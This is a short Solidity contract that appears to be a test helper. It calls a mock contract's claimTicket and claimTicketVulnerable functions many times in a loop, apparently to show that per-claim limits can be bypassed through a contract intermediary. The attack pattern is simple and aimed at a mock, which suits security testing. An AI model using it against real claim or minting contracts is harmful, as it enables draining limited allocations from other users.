// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Apollo2022Mock.sol";

contract ClaimAttacker {
    Apollo2022Mock immutable apollo;

    constructor(Apollo2022Mock _apollo){
        apollo = _apollo;
    }

    function attack1(uint256 amount) external {
        for (uint256 i = 0; i < amount; i++) {
            apollo.claimTicket();
        }
    }

    function attack2(uint256 amount) external {
        for (uint256 i = 0; i < amount; i++) {
            apollo.claimTicketVulnerable();
        }
    }
}
